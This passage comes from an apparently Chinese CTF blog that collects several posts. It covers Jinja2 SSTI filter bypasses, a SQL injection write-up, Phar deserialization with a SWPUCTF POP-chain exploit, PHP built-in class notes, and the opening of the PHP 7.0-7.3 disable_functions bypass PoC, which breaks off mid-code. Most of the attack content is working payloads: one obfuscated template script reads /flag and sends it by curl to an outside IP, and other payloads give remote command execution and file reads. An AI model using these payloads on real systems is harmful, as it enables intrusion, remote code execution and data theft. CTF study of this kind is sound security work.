For example, &#123;&#123; name|striptags|title &#125;&#125; will remove all HTML Tags from variable name and title-case the
output (title(striptags(name))).

变量可以通过过滤器修改。过滤器与变量之间用管道符号（|）隔开，括号中可以有可选参数。可以链接多
个过滤器。一个过滤器的输出应用于下一个过滤器。

例如，&#123;&#123; name|striptags|title &#125;&#125; 将删除变量名中的所有HTML标记，并将title大小写为输出(title(striptags(name)))。</code></pre>
<p>attr</p>
<pre><code>Get an attribute of an object. foo|attr(&quot;bar&quot;) works like foo.bar just that always an attribute is returned and 
items are not looked up.</code></pre>
<p>也就是说 attr用于获取变量</p>
<p>具体实例看上面！</p>
<p>format</p>
<pre><code>&#123;&#123; "%s, %s!"|format(greeting, name) &#125;&#125;</code></pre>
<pre><code>&quot;&quot;[&quot;%c%c%c%c%c%c%c%c%c&quot;|format(95,95,99,108,97,115,115,95,95)] ==&quot;&quot;.__class__</code></pre>
<p>join</p>
<pre><code>Return a string which is the concatenation of the strings in the sequence. The separator between elements is an
empty string per default, you can define it with the optional parameter:

&#123;&#123; [1, 2, 3]|join('|') &#125;&#125;
    -&gt; 1|2|3

&#123;&#123; [1, 2, 3]|join &#125;&#125;
    -&gt; 123
It is also possible to join certain attributes of an object:
&#123;&#123; users|join(', ', attribute='username') &#125;&#125;</code></pre>
<pre><code>&quot;&quot;[[&#39;__clas&#39;,&#39;s__&#39;]|join] 或者 &quot;&quot;[(&#39;__clas&#39;,&#39;s__&#39;)|join]  ==  &quot;&quot;.__class__</code></pre>
<p>replace reverse</p>
<p>可以利用替换和反转还原回我们要用的字符串</p>
<pre><code>&quot;__claee__&quot;|replace(&quot;ee&quot;,&quot;ss&quot;) 构造出字符串 &quot;__class__&quot;
&quot;__ssalc__&quot;|reverse 构造出 &quot;__class__&quot;</code></pre>
<p>string</p>
<pre><code>().__class__   出来的是&lt;class &#39;tuple&#39;&gt;
(().__class__|string)[0] 出来的是&lt;</code></pre>
<p>select unique</p>
<pre><code>Filters a sequence of objects by applying a test to each object, and only selecting the objects with the test succeeding.
If no test is specified, each object will be evaluated as a boolean.
通过对每个对象应用测试并仅选择测试成功的对象来筛选对象序列。
如果没有指定测试，则每个对象都将被计算为布尔值

Returns a list of unique items from the given iterable.</code></pre>
<pre><code>()|select|string
结果如下
&lt;generator object select_or_reject at 0x0000022717FF33C0&gt;
012345678901234567890123456789012345678901234567890123456</code></pre>
<p>拼接</p>
<pre><code>(()|select|string)[24]~
(()|select|string)[24]~
(()|select|string)[15]~
(()|select|string)[20]~
(()|select|string)[6]~
(()|select|string)[18]~
(()|select|string)[18]~
(()|select|string)[24]~
(()|select|string)[24]

得到字符串 __class__</code></pre>
<p>list</p>
<p>转换成列表<br>更多的用途是配合上面的string转换成列表，就可以调用列表里面的方法取字符了<br>只是单纯的字符串的话取单个字符方法有限</p>
<pre><code>(()|select|string)[0]
如果中括号被过滤了，挺难的
但是列表的话就可以用pop取下标了
当然都可以使用__getitem__</code></pre>
<pre><code>(()|select|string|list).__getitem__(24)~
(()|select|string|list).pop(24)~
(()|select|string|list)|attr(&#39;__getitem__&#39;)(15)~</code></pre>
<p>length，count</p>
<p>获取数字</p>
<pre><code>&#123;%set pp=dict(po=a,p=a)|join|length%&#125; = 3
&#123;%set pp=dict(p=a)|join|length%&#125; = 1
&#123;%set pp=dict(p=a)|join|count%&#125; = 1</code></pre>
<p><strong>print被ban 可以用反弹shell，贴个别人的脚本</strong></p>
<pre><code>?name=
&#123;% set c=dict(c=z)|join|length %&#125;
&#123;% set cc=dict(cc=z)|join|length %&#125;
&#123;% set ccc=dict(ccc=z)|join|length %&#125;
&#123;% set cccc=dict(cccc=z)|join|length %&#125;
&#123;% set ccccc=dict(ccccc=z)|join|length %&#125;
&#123;% set cccccc=dict(cccccc=z)|join|length %&#125;
&#123;% set ccccccc=dict(ccccccc=z)|join|length %&#125;
&#123;% set cccccccc=dict(cccccccc=z)|join|length %&#125;
&#123;% set ccccccccc=dict(ccccccccc=z)|join|length %&#125;
&#123;% set cccccccccc=dict(cccccccccc=z)|join|length %&#125;
&#123;% set space=(()|select|string|list).pop(ccccc*cc) %&#125;
&#123;% set xhx=(()|select|string|list).pop(ccc*cccccccc) %&#125;
&#123;% set point=(config|string|list).pop(cccccccccc*cc*cccccccccc-ccccccccc) %&#125;
&#123;% set maohao=(config|string|list).pop(cc*ccccccc) %&#125;
&#123;% set xiegang=(config|string|list).pop(-cccccccc*cccccccc) %&#125;
&#123;% set globals=(xhx,xhx,dict(globals=z)|join,xhx,xhx)|join %&#125;
&#123;% set builtins=(xhx,xhx,dict(builtins=z)|join,xhx,xhx)|join %&#125;
&#123;% set open=(lipsum|attr(globals)).get(builtins).open %&#125;
&#123;% set result=open((xiegang,dict(flag=z)|join)|join).read() %&#125;
&#123;% set curlcmd=(dict(curl=z)|join,space,dict(http=z)|join,maohao,xiegang,xiegang,c,c,cccccccc,point,ccc,c,point,c,cccccc,cccccccc,point,c,ccccccccc,cccccccc,maohao,ccc,ccccccccc,c,c,c,xiegang,result)|join %&#125; 
&#123;% set ohs=dict(o=z,s=z)|join %&#125;
&#123;% set shell=(lipsum|attr(globals)).get(ohs).popen(curlcmd) %&#125;</code></pre>
<p><strong>常用payload</strong></p>
<pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__")('os').popen('ls /').read()")&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
// 查看根目录</code></pre>
<pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('app.py','r').read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
//读取文件</code></pre>
<pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__']['__impo'+'rt__']('o'+'s').listdir('/')&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre>
<h3 id="bsetDB"><a href="#bsetDB" class="headerlink" title="bsetDB"></a>bsetDB</h3><p>这题没做过，服务器直接崩掉。看了别人的wp，难度容易。</p>
<p>考点：联合查询+load_file文件读取</p>
<p>注释中给了sql查询句子。</p>
<pre><code>&lt;!-- SELECT * FROM users WHERE id = &#39;$query&#39; OR username = \&quot;$query\&quot; --!&gt;</code></pre>
<p>过滤了单引号，空格。但双引号没有被ban</p>
<p>绕过空格的方法挺多的，不列举了。</p>
<pre><code>l&quot;/**/union/**/select/**/1,2,3#
接下去就是日常查表，查字段，查数据。
回显出flag.txt 但听说文件在/flag里

读数据了这里使用load_file()函数
l&quot;/**/union/**/select/**/(select/**/load_file(0x2f666c6167)),2,3#</code></pre>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/113866139">https://blog.csdn.net/rfrder/article/details/113866139</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/110220425">https://blog.csdn.net/miuzzx/article/details/110220425</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/115272645">https://blog.csdn.net/rfrder/article/details/115272645</a></p>
<p><a target="_blank" rel="noopener" href="https://shimo.im/docs/lf9OcEmdH70MC17f">https://shimo.im/docs/lf9OcEmdH70MC17f</a></p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/03/28/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
                Phar反序列化
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-03-28</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h3 id="Phar本地测验"><a href="#Phar本地测验" class="headerlink" title="Phar本地测验"></a>Phar本地测验</h3><pre><code>&lt;?php
$filename=$_GET[&#39;filename&#39;];
class AnyClass&#123;
    function __destruct()
    &#123;
        eval($this -&gt;data);
    &#125;
&#125;
include ($filename);
?&gt;</code></pre>
<pre><code>&lt;?php
class AnyClass&#123;
    function __destruct()
    &#123;
        eval($this -&gt;data);
    &#125;
&#125;
 $a = new AnyClass();
 $a-&gt;data = &quot;phpinfo();&quot;;
 $phar = new Phar(&quot;1.phar&quot;);//创建一个文件，后缀必须是phar
 $phar-&gt;startBuffering();
 $phar-&gt;setStub(&quot;GIF89a&quot;.&#39;&lt;?php __HALT_COMPILER();?&gt;&#39;);//php解析时是看这句来识别phar文件的 __HALT_COMPILER();？&gt;,前面可以加上GIF89a的头，来绕过一些检测
 $phar-&gt;setMetadata($a);//以序列化的形式存储用户自定义的meta-data，phar://伪协议解析的时候，都会将meta-data进行反序列化
 $phar-&gt;addFromString(&quot;text.txt&quot;,&quot;text&quot;);
 $phar-&gt;stopBuffering();

?&gt;</code></pre>
<p>在该目录下生成1.phar的文件。</p>
<p>然后GET传参 filename=phar://1.phar解析文件，出现phpinfo()详细信息，成功。</p>
<h3 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h3><p>在文件查看那个位置进行文件包含，查看能得到文件的源码。</p>
<pre><code>#file.php
&lt;?php 
header(&quot;content-type:text/html;charset=utf-8&quot;);  
include &#39;function.php&#39;; 
include &#39;class.php&#39;; 
ini_set(&#39;open_basedir&#39;,&#39;/var/www/html/&#39;); 
$file = $_GET[&quot;file&quot;] ? $_GET[&#39;file&#39;] : &quot;&quot;; 
if(empty($file)) &#123; 
    echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;; 
&#125; 
$show = new Show(); 
if(file_exists($file)) &#123; 
    $show-&gt;source = $file; 
    $show-&gt;_show(); 
&#125; else if (!empty($file))&#123; 
    die(&#39;file doesn\&#39;t exists.&#39;); 
&#125; 
?&gt; </code></pre>
<pre><code>#function.php
&lt;?php 
//show_source(__FILE__); 
include &quot;base.php&quot;; 
header(&quot;Content-type: text/html;charset=utf-8&quot;); 
error_reporting(0); 
function upload_file_do() &#123; 
    global $_FILES; 
    $filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;; 
    //mkdir(&quot;upload&quot;,0777); 
    if(file_exists(&quot;upload/&quot; . $filename)) &#123; 
        unlink($filename); 
    &#125; 
    move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename); 
    echo &#39;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#39;; 
&#125; 
function upload_file() &#123; 
    global $_FILES; 
    if(upload_file_check()) &#123; 
        upload_file_do(); 
    &#125; 
&#125; 
function upload_file_check() &#123; 
    global $_FILES; 
    $allowed_types = array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;); 
    $temp = explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]); 
    $extension = end($temp); 
    if(empty($extension)) &#123; 
        //echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; 
    &#125; 
    else&#123; 
        if(in_array($extension,$allowed_types)) &#123; 
            return true; 
        &#125; 
        else &#123; 
            echo &#39;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#39;; 
            return false; 
        &#125; 
    &#125; 
&#125; 
?&gt;</code></pre>
<pre><code>#class.php
&lt;?php
class C1e4r
&#123;
    public $test;
    public $str;
    public function __construct($name)
    &#123;
        $this-&gt;str = $name;
    &#125;
    public function __destruct()
    &#123;
        $this-&gt;test = $this-&gt;str;
        echo $this-&gt;test;
    &#125;
&#125;

class Show
&#123;
    public $source;
    public $str;
    public function __construct($file)
    &#123;
        $this-&gt;source = $file;   //$this-&gt;source = phar://phar.jpg
        echo $this-&gt;source;
    &#125;
    public function __toString()
    &#123;
        $content = $this-&gt;str[&#39;str&#39;]-&gt;source;
        return $content;
    &#125;
    public function __set($key,$value)
    &#123;
        $this-&gt;$key = $value;
    &#125;
    public function _show()
    &#123;
        if(preg_match(&#39;/http|https|file:|gopher|dict|\.\.|f1ag/i&#39;,$this-&gt;source)) &#123;
            die(&#39;hacker!&#39;);
        &#125; else &#123;
            highlight_file($this-&gt;source);
        &#125;

    &#125;
    public function __wakeup()
    &#123;
        if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) &#123;
            echo &quot;hacker~&quot;;
            $this-&gt;source = &quot;index.php&quot;;
        &#125;
    &#125;
&#125;
class Test
&#123;
    public $file;
    public $params;
    public function __construct()
    &#123;
        $this-&gt;params = array();
    &#125;
    public function __get($key)
    &#123;
        return $this-&gt;get($key);
    &#125;
    public function get($key)
    &#123;
        if(isset($this-&gt;params[$key])) &#123;
            $value = $this-&gt;params[$key];
        &#125; else &#123;
            $value = &quot;index.php&quot;;
        &#125;
        return $this-&gt;file_get($value);
    &#125;
    public function file_get($value)
    &#123;
        $text = base64_encode(file_get_contents($value));
        return $text;
    &#125;
&#125;
?&gt; </code></pre>
<p>POP链 C1e4r类的echo $this-&gt;test,可以触发Show类的__toString(),接着Show类的$this-&gt;str[‘str’]-&gt;source，可以用来触发Test类的 _get() -&gt;触发get函数 -&gt;触发file_get函数 base64打印出文件。</p>
<p>exp</p>
<p>这里有个地方很奇怪，读取 flag 只能用决定路径，不能使用相对路径</p>
<pre><code>&lt;?php
class C1e4r
&#123;
    public $test;
    public $str;
&#125;

class Show
&#123;
    public $source;
    public $str;
&#125;
class Test
&#123;
    public $file;
    public $params;   
&#125;
$a = new C1e4r();
$b = new Show();
$c = new Test();
$a-&gt;str = $b;
$b-&gt;str[&#39;str&#39;] = $c;
$c-&gt;params[&#39;source&#39;] = &quot;/var/www/html/f1ag.php&quot;;
$phar = new Phar(&#39;2.phar&#39;);
$phar-&gt;startBuffering();
$phar-&gt;setStub(&#39;&lt;?php __HALT_COMPILER();?&gt;&#39;);
$phar-&gt;setMetadata($a);
$phar-&gt;addFromString(&#39;text.txt&#39;,&#39;text&#39;);
$phar-&gt;stopBuffering();
?&gt; </code></pre>
<p>然后进upload查看下新生成的文件名，利用文件包含执行phar://来解析文件，修改下后缀名绕过。</p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/03/27/php%E5%86%85%E7%BD%AE%E7%B1%BB%E7%A7%AF%E7%B4%AF/">
                php内置类积累
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-03-27</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h3 id="以下总结的类的使用方法不全，都是做题目遇到时发现的。更详细资料请自己查官方文档。"><a href="#以下总结的类的使用方法不全，都是做题目遇到时发现的。更详细资料请自己查官方文档。" class="headerlink" title="以下总结的类的使用方法不全，都是做题目遇到时发现的。更详细资料请自己查官方文档。"></a>以下总结的类的使用方法不全，都是做题目遇到时发现的。更详细资料请自己查官方文档。</h3><h4 id="FilesystemIterator-file-path-PHP-5-gt-5-3-0-PHP-7"><a href="#FilesystemIterator-file-path-PHP-5-gt-5-3-0-PHP-7" class="headerlink" title="FilesystemIterator(file_path)(PHP 5 &gt;= 5.3.0, PHP 7)"></a>FilesystemIterator(file_path)(PHP 5 &gt;= 5.3.0, PHP 7)</h4><p>获取目录第一个文件名称，如果该目录下存在php文件，会获取到第一个php文件名称。</p>
<h4 id="SplFileObject-file-name-PHP-5-gt-5-1-0-PHP-7"><a href="#SplFileObject-file-name-PHP-5-gt-5-1-0-PHP-7" class="headerlink" title="SplFileObject(file_name)(PHP 5 &gt;= 5.1.0, PHP 7)"></a>SplFileObject(file_name)(PHP 5 &gt;= 5.1.0, PHP 7)</h4><p>用于对文件遍历、查找、操作</p>
<h4 id="ZipArchive-file-name-PHP-5-gt-5-2-0-PHP-7-PHP-8-PECL-zip-gt-1-1-0"><a href="#ZipArchive-file-name-PHP-5-gt-5-2-0-PHP-7-PHP-8-PECL-zip-gt-1-1-0" class="headerlink" title="ZipArchive(file_name,)(PHP 5 &gt;= 5.2.0, PHP 7, PHP 8, PECL zip &gt;= 1.1.0)"></a>ZipArchive(file_name,)(PHP 5 &gt;= 5.2.0, PHP 7, PHP 8, PECL zip &gt;= 1.1.0)</h4><p>类里的open方法可以用于删除文件。**<code>ZipArchive::OVERWRITE</code>**是数值9</p>
<h3 id="不定时跟新总结"><a href="#不定时跟新总结" class="headerlink" title="不定时跟新总结"></a>不定时跟新总结</h3>
        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/03/26/php%E5%90%84%E7%A7%8D%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">
                php各种漏洞总结
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-03-26</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <p><strong>php7-gc-bypass漏洞利用PHP garbage collector程序中的堆溢出触发进而执行命令</strong></p>
<p>影响范围为linux，php7.0-7.3</p>
<p>脚本代码</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>

<span class="token shell-comment comment"># PHP 7.0-7.3 disable_functions bypass PoC (*nix only)</span>
<span class="token shell-comment comment">#</span>
<span class="token shell-comment comment"># Bug: https:</span><span class="token comment" spellcheck="true">//bugs.php.net/bug.php?id=72530</span>
<span class="token shell-comment comment">#</span>
<span class="token shell-comment comment"># This exploit should work on all PHP 7.0-7.3 versions</span>
<span class="token shell-comment comment">#</span>
<span class="token shell-comment comment"># Author: https:</span><span class="token comment" spellcheck="true">//github.com/mm0r1</span>

<span class="token function">pwn</span><span class="token punctuation">(</span><span class="token string">"/var/www/html/index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//修改此处命令，进行命令执行</span>

<span class="token keyword">function</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
    <span class="token keyword">global</span> <span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$helper</span><span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
        <span class="token variable">$address</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token variable">$s</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">--</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
            <span class="token variable">$address</span> <span class="token operator">&lt;</span><span class="token operator">&lt;=</span> <span class="token number">8</span><span class="token punctuation">;</span>
            <span class="token variable">$address</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$p</span><span class="token operator">+</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
        <span class="token keyword">return</span> <span class="token variable">$address</span><span class="token punctuation">;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>

    <span class="token keyword">function</span> <span class="token function">ptr2str</span><span class="token punctuation">(</span><span class="token variable">$ptr</span><span class="token punctuation">,</span> <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
        <span class="token variable">$out</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$m</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
            <span class="token variable">$out</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$ptr</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$ptr</span> <span class="token operator">></span><span class="token operator">>=</span> <span class="token number">8</span><span class="token punctuation">;</span>
        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
        <span class="token keyword">return</span> <span class="token variable">$out</span><span class="token punctuation">;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>

    <span class="token keyword">function</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">,</span> <span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token variable">$n</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
        <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$n</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
            <span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$p</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$v</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$v</span> <span class="token operator">></span><span class="token operator">>=</span> <span class="token number">8</span><span class="token punctuation">;</span>
        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>

    <span class="token keyword">function</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">,</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
        <span class="token keyword">global</span> <span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$helper</span><span class="token punctuation">;</span>
        <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token variable">$p</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$helper</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">!=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &amp;#125;</span>
        <span class="token keyword">return</span> <span class="token variable">$leak</span><span class="token punctuation">;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>

    <span class="token keyword">function</span> <span class="token function">parse_elf</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
        <span class="token variable">$e_type</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token variable">$e_phoff</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$e_phentsize</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$e_phnum</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$e_phnum</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
            <span class="token variable">$header</span> <span class="token operator">=</span> <span class="token variable">$base</span> <span class="token operator">+</span> <span class="token variable">$e_phoff</span> <span class="token operator">+</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token variable">$e_phentsize</span><span class="token punctuation">;</span>
            <span class="token variable">$p_type</span>  <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$p_flags</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$p_vaddr</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$p_memsz</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$p_type</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$p_flags</span> <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123; # PT_LOAD, PF_Read_Write</span>
                <span class="token shell-comment comment"># handle pie</span>
                <span class="token variable">$data_addr</span> <span class="token operator">=</span> <span class="token variable">$e_type</span> <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">?</span> <span class="token variable">$p_vaddr</span> <span class="token punctuation">:</span> <span class="token variable">$base</span> <span class="token operator">+</span> <span class="token variable">$p_vaddr</span><span class="token punctuation">;</span>
                <span class="token variable">$data_size</span> <span class="token operator">=</span> <span class="token variable">$p_memsz</span><span class="token punctuation">;</span>
            <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &amp;#123; # PT_LOAD, PF_Read_exec</span>
                <span class="token variable">$text_size</span> <span class="token operator">=</span> <span class="token variable">$p_memsz</span><span class="token punctuation">;</span>
            <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>

        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$data_addr</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$text_size</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$data_size</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>

        <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$text_size</span><span class="token punctuation">,</span> <span class="token variable">$data_size</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>

    <span class="token keyword">function</span> <span class="token function">get_basic_funcs</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token variable">$elf</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
